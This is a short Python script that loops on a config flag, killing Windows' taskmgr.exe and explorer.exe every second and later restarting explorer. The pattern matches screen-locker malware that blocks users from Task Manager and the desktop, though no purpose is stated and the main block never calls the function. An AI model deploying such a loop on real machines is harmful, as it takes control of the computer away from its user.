import os, time, json
CURRENT_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)))
import process_orchestration

def orchestrate_process():
    while True:
        with open(os.path.join(CURRENT_DIR, "config.json"), "r") as f:
            if json.loads(f.read())["kill_processes"]:
                process_orchestration.ProcessOrchestration().kill_processes("taskmgr.exe")
                process_orchestration.ProcessOrchestration().kill_processes("explorer.exe")
                f.close()
                time.sleep(1)
            else:
                process_orchestration.ProcessOrchestration().start_processes("explorer.exe")
                exit(0)

if __name__ == "__main__":
    pass